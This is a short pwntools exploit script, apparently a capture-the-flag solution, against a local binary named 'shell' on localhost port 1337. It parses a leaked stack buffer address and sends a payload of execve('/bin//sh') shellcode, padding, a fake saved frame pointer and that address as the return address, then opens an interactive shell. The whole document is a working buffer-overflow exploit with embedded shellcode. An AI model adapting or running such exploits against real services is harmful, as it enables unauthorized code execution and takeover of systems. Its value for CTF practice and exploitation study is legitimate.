from pwn import *

context.binary = binary = ELF('./shell')


# p = process(level="debug")
# p = process()
p =remote('localhost', 1337)
# gdb.attach(p, '''c''')
offset = 215

#27 bytes
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

output = p.recvuntil(b'Enter your shellcode:').decode('utf-8')


print("Received Output:\n", output)

try:

    buffer_address = output.split('battlefield:')[1].split('\n')[0].strip()


    print("Buffer Address:", buffer_address)


    converted_buffer_address = int(buffer_address, 16)
    print("Converted Buffer Address:", converted_buffer_address)
except (IndexError, ValueError) as e:
    print("Error parsing buffer address:", e)


payload = shellcode + b"A"*(208 - len(shellcode)) + b"B"*8 + p64(converted_buffer_address)

p.sendline(payload)

p.interactive()